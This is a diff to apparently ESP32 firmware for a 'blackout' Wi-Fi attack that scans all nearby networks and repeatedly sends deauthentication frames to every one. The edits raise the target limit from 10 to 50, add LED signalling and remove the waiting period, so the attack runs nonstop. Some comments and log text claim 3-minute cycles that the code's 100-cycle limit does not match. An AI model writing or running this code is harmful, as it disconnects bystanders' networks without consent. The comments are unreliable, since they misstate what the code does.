@@ -150,7 +150,7 @@ static TaskHandle_t blackout_attack_task_handle = NULL;
 static volatile bool blackout_attack_active = false;
 
 // Target BSSID monitoring
-#define MAX_TARGET_BSSIDS 10
+#define MAX_TARGET_BSSIDS 50
 static target_bssid_t target_bssids[MAX_TARGET_BSSIDS];
 static int target_bssid_count = 0;
 static uint32_t last_channel_check_time = 0;
@@ -1040,7 +1040,13 @@ static void blackout_attack_task(void *pvParameters) {
     
     MY_LOG_INFO(TAG, "Blackout attack task started.");
     
-    // Main loop: scan every 3 minutes, sort by channel, attack all networks
+    // Set LED to orange for blackout attack
+    esp_err_t led_err = led_strip_set_pixel(strip, 0, 255, 165, 0); // Orange
+    if (led_err == ESP_OK) {
+        led_strip_refresh(strip);
+    }
+    
+    // Main loop: continuously scan and attack for 3 minutes each cycle
     while (blackout_attack_active && !operation_stop_requested) {
         MY_LOG_INFO(TAG, "Starting blackout cycle: scanning all networks...");
         
@@ -1098,15 +1104,27 @@ static void blackout_attack_task(void *pvParameters) {
         // Save target BSSIDs for deauth attack
         save_target_bssids();
         
-        MY_LOG_INFO(TAG, "Starting deauth attack on all %d networks (sorted by channel)...", g_selected_count);
+        MY_LOG_INFO(TAG, "Starting deauth attack on all %d networks for 100 cycles...", g_selected_count);
         
-        // Attack all networks (no periodic rescan needed since we rescan every 3 minutes)
+        // Attack all networks for exactly 3 minutes (1800 cycles at 100ms each)
         int attack_cycles = 0;
-        const int MAX_ATTACK_CYCLES = 180; // 3 minutes at 100ms per cycle = 1800 cycles, but we'll do fewer cycles
+        const int MAX_ATTACK_CYCLES = 100;
         
         while (attack_cycles < MAX_ATTACK_CYCLES && blackout_attack_active && !operation_stop_requested) {
+            // Flash LED during attack (orange)
+            esp_err_t led_err = led_strip_set_pixel(strip, 0, 255, 165, 0); // Orange
+            if (led_err == ESP_OK) {
+                led_strip_refresh(strip);
+            }
+            
             // Send deauth frames to all networks
             wsl_bypasser_send_deauth_frame_multiple_aps(g_scan_results, g_selected_count);
+            
+            // Clear LED briefly
+            led_err = led_strip_clear(strip);
+            if (led_err == ESP_OK) {
+                led_strip_refresh(strip);
+            }
             
             attack_cycles++;
             vTaskDelay(pdMS_TO_TICKS(100)); // 100ms delay between attack cycles
@@ -1117,12 +1135,15 @@ static void blackout_attack_task(void *pvParameters) {
             break;
         }
         
-        MY_LOG_INFO(TAG, "Attack cycle completed, waiting 3 minutes before next scan...");
+        MY_LOG_INFO(TAG, "3-minute attack cycle completed, starting new scan...");
         
-        // Wait 3 minutes before next scan (180 seconds)
-        for (int wait_cycle = 0; wait_cycle < 1800 && blackout_attack_active && !operation_stop_requested; wait_cycle++) {
-            vTaskDelay(pdMS_TO_TICKS(100)); // 100ms chunks for responsive stop
-        }
+        // Immediately start next scan cycle (no waiting)
+    }
+    
+    // Clean up LED after attack finishes
+    led_err = led_strip_clear(strip);
+    if (led_err == ESP_OK) {
+        led_strip_refresh(strip);
     }
     
     // Clean up
